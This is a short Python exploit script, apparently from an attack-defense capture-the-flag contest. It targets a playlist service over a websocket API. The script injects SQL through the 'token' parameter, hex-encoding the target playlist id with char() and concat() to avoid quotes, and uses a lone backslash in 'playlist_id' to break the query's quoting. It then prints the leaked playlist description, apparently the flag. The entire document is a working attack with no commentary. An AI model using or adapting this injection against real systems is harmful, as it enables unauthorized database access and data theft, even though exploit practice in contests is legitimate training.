from modules.client import Client
import asyncio
import json

import sys

async def exploit(ip, flag_id):
    playlist_id = flag_id
    uri = f"ws://{ip}:5000/api"
    client = Client(uri)
    client.logger.setLevel(50)
       
    encoded_string = [hex(ord(x)) for x in playlist_id]
    encoded_string = [f"char({x})" for x in encoded_string]
    encoded_string = ",".join(encoded_string)
    encoded_string = f"concat({encoded_string})"

    request = {
        'action': 'GET_PLAYLIST',
        'params': {
            'token': f" OR p.id = {encoded_string} # ",
            'playlist_id': "\\"
        }
    }
    response = await client.send(request)
    return response["description"]

if __name__ == "__main__":
    ip = sys.argv[1]
    flag_id = sys.argv[2]
    print(asyncio.run(exploit(ip, flag_id)))